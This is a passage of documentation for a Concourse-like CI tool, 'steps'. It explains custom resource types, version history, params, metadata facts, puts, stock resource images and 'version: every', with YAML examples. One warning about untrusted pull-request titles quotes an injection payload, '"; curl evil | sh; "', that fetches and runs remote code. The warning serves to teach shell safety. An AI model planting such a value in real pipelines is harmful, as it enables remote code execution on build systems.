# the pruning. This example pins only that the field loads and a capped
# resource still fetches normally.
defaults:
  # A git branch produces a version per push; a chat feed one per message.
  # The right number is a property of what you watch.
  version_history: 50

resource_types:
  - name: counter
    config:
      check: |
        printf '[{"n": "1"}, {"n": "2"}]'
      in: echo {{ .version.n | shellquote }} > n.txt

resources:
  - name: ticks
    type: counter
    source: {}

jobs:
  - name: build
    plan:
      - get: ticks
      - task: show
        inputs: [ticks]
        run: cat ticks/n.txt
        assert:
          stdout: "2"
    assert:
      execution: [ticks, show]
      outcome: succeeded
```

`--version-history` sets a default for a pipeline that does not; when neither
says, steps keeps 1000. Whatever the limit, the newest versions are the ones
kept.

```yaml
resource_types:
  - name: since-cursor
    config:
      # A real type would send this to an API. Here it just reports what it was
      # handed, which is the part worth seeing: on a fresh run there is no
      # cursor, so the default is what the check gets.
      check: |
        printf '[{"seen": "%s"}]' {{ index .version "ts" | default "0" | shellquote }}
      in: echo {{ .version.seen | shellquote }} > seen.txt

resources:
  - name: feed
    type: since-cursor
    source: {}

jobs:
  - name: poll
    plan:
      - get: feed
      - task: show
        inputs: [feed]
        run: cat feed/seen.txt
        assert:
          stdout: "0"      # nothing recorded yet, so the check saw the default
    assert:
      execution: [feed, show]
      outcome: succeeded
```

### `in` — fetch one version

Runs when a `get` step executes.

- **Sees**: `{{ .source }}`, `{{ .version }}` (one object from `check`'s array), and `{{ .params }}` (the get step's `params:`).
- **Working directory** is the artifact directory itself, already created and empty. Write the contents there — `.`, not a subdirectory named after the resource.
- **Exit non-zero** to fail the step.
- **May print facts** about the version — a link, a title, an author — as Concourse resources do: when the whole of stdout is `{"version": {...}, "metadata": [{"name": "url", "value": "https://..."}]}`, each `metadata` entry is shown under the step. Log to stderr; stdout that is anything else is the script's own output and reports nothing. See [Facts](#facts-what-a-get-or-put-says-about-its-version).

`params:` on a get is how a resource is told *how* to fetch, as opposed to `source:`, which says *what* to fetch. The distinction matters because `source:` belongs to the resource and `params:` belongs to the step, so one resource can be fetched differently by different jobs without being declared twice:

```yaml
resource_types:
  - name: notes
    config:
      check: |
        printf '[{"ref": "v1"}]'
      in: |
        head -n {{ index .params "lines" | default "100" | shellquote }} <<'EOF' > notes.txt
        first line
        second line
        EOF

resources:
  - name: log
    type: notes
    source: {}

jobs:
  - name: quick
    plan:
      - get: log
        params: {lines: 1}   # this job fetches a truncated view
      - task: show
        inputs: [log]
        run: wc -l < log/notes.txt
        assert:
          stdout: "1"        # the param reached in:
    assert:
      execution: [log, show]
      outcome: succeeded

  - name: full
    plan:
      - get: log             # same resource, whole thing
      - task: show
        inputs: [log]
        run: wc -l < log/notes.txt
        assert:
          stdout: "2"        # no param, so the default won — same resource, other view
    assert:
      execution: [log, show]
      outcome: succeeded

assert:
  execution: [quick, full]
```

**Optional params take the same shape as an optional `source:` field** (see [Shell safety](#shell-safety) below). Templates render with `missingkey=error`, so a bare `{{ .params.lines }}` makes `lines` *mandatory* on every get of that type; `{{ index .params "lines" | default "100" }}` works on an absent key and on a get with no `params:` block at all.

**Params change the fetch, so they change the hash.** Two gets of one version differing in `params:` are two different fetches: they get distinct cache entries and neither is reused for the other. A get with no `params:` hashes as if the field did not exist, so adding `params:` to one get invalidates nothing that does not use it.

The fetched directory is named after the `get:`, so `get: log` puts it in `log/`, and later steps read `log/...`. See [workspace.md](workspace.md) for what a step can and can't see.

### `out` — publish something

Runs when a `put` step executes. Optional: a type with no `out:` is read-only, and a `put:` against it is rejected at load time rather than silently doing nothing.

- **Sees**: `{{ .source }}` and `{{ .params }}` (the put step's `params:`).
- **Working directory** is the put step's read view, composed from its `inputs:`.
- **May print** a single JSON **object** — the version it produced. Printing nothing is fine and not an error. The object is stored as a version, shown on the job page, and rendered into downstream `in:` commands, so print identifiers, not credentials or whole API responses, and quote it with `shellquote`. Over 4 KiB it is not recorded.
- **May print Concourse's answer instead**, `{"version": {...}, "metadata": [...]}`: the inner object is the version, and the metadata is the put's [facts](#facts-what-a-get-or-put-says-about-its-version). An object whose only key is `version` holding an object is read this way too.

### Facts: what a get or put says about its version

A resource can hand back facts about what it touched — Concourse calls them metadata: a short list of names and values, usually a link to the thing a put published or a get fetched. steps shows them under the step, on the terminal and on the run page, where any `http` or `https` address is a link. The live terminal view ends a run with a **Published** list of the links its puts reported, and the run page lists them at the top; plain output (`--progress plain`, or not a terminal) prints each fact as it arrives and has no end-of-run list. Facts are kept beside the version in the state database, so the job page and the resource page show them next to each version, and a get the [resource cache](workspace.md#cross-build-resource-cache) answers without fetching again still shows what this resource said when it last fetched or published that version. The facts are kept per pipeline and resource while the cache is shared by source, so a version another pipeline (or another resource with the same type and source) fetched first shows none until this resource fetches or publishes it itself. [The built-in GitHub types](#the-built-in-github-types) report theirs with no pipeline change.

```yaml
resource_types:
  - name: ticket
    config:
      check: |
        printf '[{"id": "412"}]'
      in: |
        echo fetching ticket {{ .version.id | shellquote }} >&2   # logs go to stderr
        echo {{ .version.id | shellquote }} > id
        printf '{"version": {"id": "412"}, "metadata": [{"name": "url", "value": "https://tickets.example/412"}, {"name": "title", "value": "Add the widget cache"}]}'
      out: |
        # the get's fact, handed over as a param and quoted by this template
        test {{ .params.about | shellquote }} = https://tickets.example/412
        printf '{"version": {"id": "2291"}, "metadata": [{"name": "url", "value": "https://tickets.example/412#comment-2291"}]}'

resources:
  - name: ticket
    type: ticket
    source: {}

  - name: comment
    type: ticket
    source: {}

jobs:
  - name: answer
    plan:
      - get: ticket      # shows url and title under the step
      - task: read
        inputs: [ticket]
        run: cat ticket/id
        assert:
          stdout: "412"  # the in: wrote its tree as usual
      - put: comment     # shows the comment's url, and lists it as published
        params:
          about: ((.:ticket.url))   # a later step reads the get's facts
    assert:
      execution: [ticket, read, comment]
      outcome: succeeded
```

A name or value is shown as text: control characters are dropped, each is cut at a few kilobytes, and a resource reports at most 64. A value that is not an `http` or `https` address is never a link. Facts pass through the run's secret masking before they are shown or kept, but they are shown to everyone who can read the run, so a resource should report links and titles, not tokens.

**A later step reads a get's facts as `((.:get.name))`** — `((.:ticket.url))` above — as Concourse (v8.1.0 on) does. The name is the get's own, `get: pr` giving `((.:pr.url))` whatever resource it fetches. It follows the rules of a [captured value](templating.md#values-the-run-captures-load_var-and-name): refused at load unless a get earlier in the plan produces it, never hidden in step output (a fact is what the resource chose to show), and a fact the get did not report fails the step that reads it. A name reported twice keeps its last value. A get whose fetch the resource cache reused, or that a resumed run had already fetched, hands over the facts kept with the version.

**A fact in `run:` is shell somebody else wrote.** It is pasted into `sh -c` as text, and a fact is whatever the resource reported: a pull request's title is its author's, so a title of `"; curl evil | sh; "` runs. There is no `shellquote` for `((.:name))` — Concourse's tasks take an argv, not a shell line — so `steps validate` warns on every get's fact in a `run:`. Read the get's own files instead, quoted (`"$(cat pr/title)"`, whichever files its type writes), or hand the fact to a put's `params:`, where a resource template quotes it. The example above hands its `url` to the put that way.

**A step reading a get's facts always runs**: neither a chain skip nor the step cache stands in for it, because the facts are only known once the run is under way — the same version can be fetched with a new title. Steps before it are skipped as usual.

**A put's facts are shown and kept, but a later step cannot read them.** In Concourse a later step reaches them through the fetch that automatically follows a put; steps has no such fetch ([below](#a-put-publishes-it-does-not-fetch)), so `((.:comment.url))` after `put: comment` is a load error saying so.

### A put publishes; it does not fetch

A put step runs `out:` and nothing else — there is no implicit get afterward, so a put produces no artifact. (Concourse fetches the produced version automatically; steps deliberately does not: an artifact appearing in the build that no step declared is exactly the kind of ambient data flow this DSL rejects.) A plan that wants the resource's contents after a put writes the fetch it means:

```yaml
resource_types:
  - name: release
    config:
      check: |
        printf '[{"ref": "v1.4.1"}]'
      in: echo {{ .version.ref | shellquote }} > ref
      out: |
        cat notes/summary.txt        # "publish" the summary an earlier step wrote
        printf '{"ref": "v1.4.2"}'

resources:
  - name: releases
    type: release
    source: {}

jobs:
  - name: publish
    plan:
      - task: summarize
        outputs: [notes]
        run: echo 'what changed' > notes/summary.txt
      - put: releases          # out: publishes and prints v1.4.2
        inputs: [notes]
      - get: releases          # fetch the resource, explicitly
      - task: verify
        inputs: [releases]
        run: cat releases/ref
        assert:
          # check's answer, NOT the v1.4.2 the put just printed — the get was
          # pinned when the plan was built, before out: ran. See below.
          stdout: v1.4.1
    assert:
      execution: [summarize, releases, releases, verify] # put, then get — two entries
      outcome: succeeded
```

The explicit get fetches the version `check` reported **when the plan was built** — check runs once, before any step, so the version the put publishes mid-run is not what the same run's get fetches (the example above pins exactly that: `out:` prints `v1.4.2`, the get still fetches `v1.4.1`). The version a put prints is recorded with the run; it reaches a `passed:`-gated get in a later run whether or not a check ever reports it (see [`passed:`](infra.md#a-version-a-job-put-counts-as-having-passed-it)); an ungated get still needs the check to report it. A put whose output nothing reads simply has no get after it.

## Running a stock Concourse resource image

A resource type can be one of Concourse's own resource images, spelled as Concourse spells it: `type: registry-image`, with the image in `source.repository`. steps runs the image's own `/opt/resource/check`, `in` and `out`, and hands each one Concourse's request — `{source, version, params}` — as JSON on its standard input, the way Concourse does.

```yaml noexec=docker
resource_types:
  - name: git
    type: registry-image
    source:
      repository: concourse/git-resource
      tag: "1.18"                     # pin it: latest is pulled once and never refreshed
      # username: robot                 # a private image's login, with password_env: REGISTRY_TOKEN
    defaults:                         # source: keys every git resource gets; its own keys win
      branch: main

resources:
  - name: repo
    type: git
    source:
      uri: git@github.com:acme/app.git
    secrets:
      private_key: ((ci:deploy_key))  # becomes source.private_key, on stdin only

jobs:
  - name: build
    plan:
      - get: repo
        params: {depth: 1}
      - task: look
        inputs: [repo]
        run: git -C repo log -1 --oneline
      - put: repo
        inputs: [repo]
        params: {repository: repo}
```

What steps does, and where it differs from Concourse:

- **`check`** is sent no `version` the first time, and the version it last reported after that. Its answer is the usual array of versions, oldest first.
- **`in`** runs in `/tmp/build/get` and is handed that directory as its first argument; **`out`** runs in `/tmp/build/put`, each input a directory beneath it. Both answer `{version, metadata}`: steps records the `version`, and shows each `metadata` entry as a note on the step. An answer with no version fails the step, as it does in Concourse.
- **Credentials go in `secrets:`, not `source:`.** A resource's `secrets:` entries are laid over its `source:` in the request, under the same key, so `secrets: {private_key: ((ci:deploy_key))}` arrives as `source.private_key`. They are resolved from a [secret source](secrets.md) when the script runs, never hashed or stored, and masked in output. A credential written straight into `source:` is stored with every version, as any `source:` value is.
- **`in` and `out` see Concourse's build variables**, spelled from steps' own: `BUILD_ID` and `BUILD_NAME` are the run id, `BUILD_JOB_NAME` and `BUILD_PIPELINE_NAME` the job and pipeline, `ATC_EXTERNAL_URL` is `STEPS_URL`, and `BUILD_TEAM_NAME` is always `main`, since steps has no teams. `check` sees none of them, as in Concourse.
- **A `put` gets only the inputs it lists.** Concourse guesses them from `params:` when none are listed; steps does not guess, so list the ones `out` reads.
- **Each check starts a fresh container**, so a resource that keeps a clone between checks (git does) clones again every poll.
- **No `type:` other than `registry-image`**, and the type takes no `image:` or `config:`: the image's scripts are the config. `source:` on a type takes `repository`, `tag`, and a login for a private image: `username` with `password_env`, the **name** of a variable in the daemon's environment (a type has no `secrets:` of its own). The image is pulled with that login and no other; steps reads none of docker's own.
- **`tag` must be a string.** Unquoted, YAML reads `tag: 1.10` as the number 1.1 and would pull the wrong image, so a tag that is not a string is refused at load: write `tag: "1.10"`. Concourse reads the same YAML the same way; steps refuses rather than guess.

## Shell safety

Anything interpolated into a command is text substitution, so quote it:

```yaml fragment
check: git ls-remote {{ .source.uri | shellquote }}     # good
check: git ls-remote {{ .source.uri }}                  # a uri with a space or ; breaks or worse
```

`shellquote` renders a value as one safely-quoted shell word. Use it for every `{{ }}` that reaches a command. See [templating.md](templating.md).

Templates render with `missingkey=error`, so reading an optional field that wasn't set fails the render. Ask for optional fields in a way that can answer "nothing":

```yaml fragment
{{ index .source "branch" | default "HEAD" }}     # optional
{{ .source.uri }}                                 # required — failing is correct
```

## `version:` on a get step

By default a get fetches the **latest** version `check` reported. `version: every` runs the rest of the plan once per version, and a mapping pins one exact version:

```yaml
resource_types:
  - name: builds
    config:
      check: |
        printf '[{"number": "87"}, {"number": "88"}]'
      in: echo {{ .version.number | shellquote }} > number.txt

resources:
  - name: build
    type: builds
    source: {}

jobs:
  - name: latest-only
    plan:
      - get: build                 # default: "88", the newest
      - task: show
        inputs: [build]
        run: cat build/number.txt
        assert:
          stdout: "88"
    assert:
      execution: [build, show]
      outcome: succeeded

  - name: each-in-turn
    plan:
      - get: build
        version: every             # the rest of the plan runs per version
      - task: show
        inputs: [build]
        run: cat build/number.txt  # no stdout assert: this runs once per version
    assert:
      execution: [build, show, build, show] # one run per version, judged together
      outcome: succeeded

  - name: pinned
    plan:
      - get: build
        version: {number: "87"}    # exactly this one
      - task: show
        inputs: [build]
        run: cat build/number.txt
        assert:
          stdout: "87"             # the pin won over the newer version
    assert:
      execution: [build, show]
      outcome: succeeded

assert:
  execution: [latest-only, each-in-turn, pinned]
```

Under `every`, **each version is a run of its own**, as each is a build of its own in Concourse — so `max_in_flight:`, `serial:`, the job's history and **Retry** all count versions. `steps web` builds the oldest version the job has not taken and queues the job again while more wait, so a backlog drains one run per version and, under `max_in_flight: 2`, two at a time. `steps run` builds one version per invocation, as `fly trigger-job` does, and says how many still wait; `steps test` builds every version, each as its own run, and judges the job's `assert:` over all of them, which is why the example above asserts two passes. A failing version does not stop the ones behind it.

### `every` takes each version once

A check reports what *exists*, not what is new — the same twenty Slack messages, the same page of builds, on every poll. So `every` remembers: once a version's run has **started**, that version is not taken again, and a later run takes only what is left. Without that, a plan ending in a `put:` — which the step cache never skips, because its worth is an effect rather than an artifact — repeats every effect it has ever performed each time anything new shows up.

- **Recorded per (job, resource)**, so another job reading the same resource keeps its own place.
- **A version is taken when its build STARTS**, not when it succeeds — so a version whose build failed is not retried on the next run. This is Concourse's rule (`NextEveryVersion` reads the versions a build was *created* with and never looks at build status), and it is what stops one bad input failing forever, on every trigger, with an agent's bill attached. Re-running it is a deliberate act: `--resume` (the run that took it) or `--pin` (the version), or a new version.
- **`--force` does not lift it**: it skips the step cache only (#145). `steps test` is the exception — it re-opens taken versions so a fixture reruns deterministically against the same state file.
- **It suppresses; [history](#version-history) is what resurrects.** The versions a job may take are the ones steps has recorded, not only the ones `check` returns right now — so a version that scrolled out of the window while nothing was watching is still built. What history does not hold, nothing can recover: a version pruned by `version_history:`, or one from before steps first checked the resource.

- **Any top-level `get:` in a plan may say `every`** — each keeps its own cursor. Anywhere else (inside a hook, or a branch of `in_parallel:`/`do:`/`try:`) the get runs within a build whose versions are already decided, so `every` there is a load error rather than a field that is accepted and ignored. Two `every` gets on the same resource are a load error too — one cursor cannot serve both.
- **A second get of the same resource keeps its own version.** `get: code, version: every` beside `get: baseline, resource: code, version: {ref: "v1"}` fans over `code` while `baseline` stays pinned, which is how a plan diffs what just arrived against a fixed point.

`steps plan` reads the same record, so it lists only the versions a run would actually take.

### Several `every` gets: input sets

When more than one get says `every`, a run resolves **input sets**, Concourse's model: each `every` get advances one step per set through its own unbuilt versions, in lockstep with its siblings, and each set is a run of its own. A get whose versions run out **holds** at the newest version it has already covered while the others keep moving. There is no cross product — 3 new versions on one input and 2 on another mean three builds, not six.

The hold rule is what makes the steady state right, not just the burst: updates rarely arrive in matched pairs. `config` moving alone builds `(code@held, config@new)`; `code` catching up later builds `(code@new, config@held)`.

```yaml
resource_types:
  - name: builds
    config:
      check: |
        printf '[{"number": "87"}, {"number": "88"}, {"number": "89"}]'
      in: echo {{ .version.number | shellquote }} > number.txt

  - name: configs
    config:
      check: |
        printf '[{"rev": "5"}, {"rev": "6"}]'
      in: echo {{ .version.rev | shellquote }} > rev.txt

resources:
  - name: build
    type: builds
    source: {}

  - name: conf
    type: configs
    source: {}

jobs:
  - name: pairwise
    plan:
      - get: build
        version: every
      - get: conf
        version: every
      - task: show
        inputs: [build, conf]
        # The case pins the pairing, not just the count: a cross product would
        # build (87,6), (88,5) or (89,5) and fail here.
        run: |
          pair="$(cat build/number.txt)-$(cat conf/rev.txt)"
          case "$pair" in
            87-5|88-6|89-6) echo "took $pair" ;;
            *) echo "unexpected pair $pair"; exit 1 ;;
          esac
        assert:
          stdout: took
    assert:
      # Three sets, not six: (87,5), (88,6), then conf is exhausted and
      # HOLDS at rev 6 while build keeps moving — (89,6).
      execution: [build, conf, show, build, conf, show, build, conf, show]
      outcome: succeeded

assert:
  execution: [pairwise]
```

## `trigger: true`

Marks a `get` as something `steps web` should poll. When its version changes, the jobs containing it run automatically. Valid only on `get` steps — setting it anywhere else is a load-time error.

```yaml
resource_types:
  - name: ticker
    config:
      check: |
        printf '[{"tick": "1"}]'
      in: echo {{ .version.tick | shellquote }} > tick.txt

resources:
  - name: clock
    type: ticker
    source: {}

jobs:
  - name: on-change
    plan:
      - get: clock
        trigger: true  # steps web polls this; a new version runs the job
      - task: react
        inputs: [clock]
        run: cat clock/tick.txt
        assert:
          stdout: "1"
    assert:
      execution: [clock, react]
      outcome: succeeded
```

See [infra.md](infra.md) for the watch loop and cross-job triggering, and [webhooks.md](webhooks.md) for a resource whose versions are webhook deliveries. Gating a get on upstream jobs — Concourse's `passed:` — is there too: [infra.md#passed](infra.md#passed--only-run-against-versions-that-are-green-upstream).

## MCP-backed types

A resource type can call an MCP server instead of running shell commands — the same check/in/out roles, as tool calls. See [mcp.md](mcp.md).

## Checking your work

`steps validate pipeline.yml` answers "does it parse and hang together"; `steps plan pipeline.yml` runs `check` and shows what would be fetched vs cached — the fastest way to see whether a `check` you just wrote returns what you expect, since it resolves versions without running the rest of the job.
